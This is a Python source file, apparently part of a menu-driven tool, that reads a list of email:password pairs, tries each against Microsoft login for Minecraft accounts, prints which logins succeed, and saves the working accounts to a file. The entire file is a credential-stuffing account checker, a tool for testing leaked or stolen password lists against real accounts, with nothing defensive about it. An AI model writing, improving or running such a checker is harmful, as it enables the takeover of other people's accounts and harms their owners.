#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import time
import os
import threading
from utils import clear, print_banner, gradient_print, gradient_input

try:
    import minecraft_launcher_lib as mll
    MLL_AVAILABLE = True
except ImportError:
    MLL_AVAILABLE = False

def check_account(email, password):
    try:
        login_data = mll.microsoft_account.complete_login(email, password)
        if login_data and "access_token" in login_data:
            profile = mll.microsoft_account.get_own_profile(login_data)
            username = profile.get("name", "?")
            uuid = profile.get("id", "?")
            return True, "Success", username, uuid
        else:
            return False, "Invalid email or password", None, None
    except mll.microsoft_account.MicrosoftAuthError as e:
        return False, f"Microsoft error: {e}", None, None
    except Exception as e:
        return False, f"Error: {e}", None, None

def load_accounts_from_file(filepath):
    accounts = []
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                if ':' not in line:
                    continue
                email, pwd = line.split(':', 1)
                accounts.append((email.strip(), pwd.strip()))
        return accounts
    except FileNotFoundError:
        return None
    except Exception:
        return []

def check_accounts_interactive():
    clear()
    print_banner()
    if not MLL_AVAILABLE:
        gradient_print(" [Error] minecraft-launcher-lib not installed.", 0.03)
        gradient_print(" Install: pip install minecraft-launcher-lib", 0.03)
        gradient_input("\n Press Enter...")
        return
    filepath = gradient_input(" Path to accounts file (format email:password): ").strip()
    if not filepath:
        gradient_print(" Path not provided.", 0.03)
        time.sleep(1)
        return
    accounts = load_accounts_from_file(filepath)
    if accounts is None:
        gradient_print(f" File {filepath} not found.", 0.03)
        time.sleep(1.5)
        return
    if not accounts:
        gradient_print(" No valid accounts in file (need email:password).", 0.03)
        time.sleep(1.5)
        return
    total = len(accounts)
    gradient_print(f"\n Checking {total} accounts...", 0.03)
    time.sleep(1)
    results = []
    for i, (email, pwd) in enumerate(accounts, 1):
        gradient_print(f" [{i}/{total}] Testing {email}...", 0.02)
        valid, msg, username, uuid = check_account(email, pwd)
        if valid:
            gradient_print(f"   ✓ {email} -> {username} ({uuid})", 0.02)
        else:
            gradient_print(f"   ✗ {email} -> {msg}", 0.02)
        results.append((email, valid, msg, username, uuid))
        time.sleep(0.5)
    valid_count = sum(1 for r in results if r[1])
    gradient_print(f"\n Result: {valid_count} valid out of {total}", 0.03)
    if valid_count > 0:
        save = gradient_input(" Save valid accounts to file (valid_accounts.txt)? (y/n): ").strip().lower()
        if save == 'y':
            with open("valid_accounts.txt", "w", encoding="utf-8") as f:
                for email, valid, msg, username, uuid in results:
                    if valid:
                        f.write(f"{email}:{username}:{uuid}\n")
            gradient_print(" Saved to valid_accounts.txt", 0.03)
    print()
    gradient_input(" Press Enter to return to menu...")